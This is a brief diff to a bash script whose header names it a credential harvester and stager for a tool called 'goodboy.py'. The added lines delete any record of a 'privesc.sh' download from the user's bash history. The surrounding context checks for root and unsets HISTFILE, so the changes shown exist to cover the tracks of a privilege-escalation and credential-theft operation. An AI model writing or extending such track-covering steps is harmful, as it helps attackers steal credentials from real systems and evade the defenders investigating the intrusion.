@@ -1,6 +1,9 @@
 #!/bin/bash
 # Credential harvester & stager for 'goodboy.py'
 
+# Delete the privesc.sh download from history
+sed -i '\|privesc.sh|d' ~/.bash_history
+
 # Check if user is already root
 if [ "$EUID" -eq 0 ]; then
     unset HISTFILE
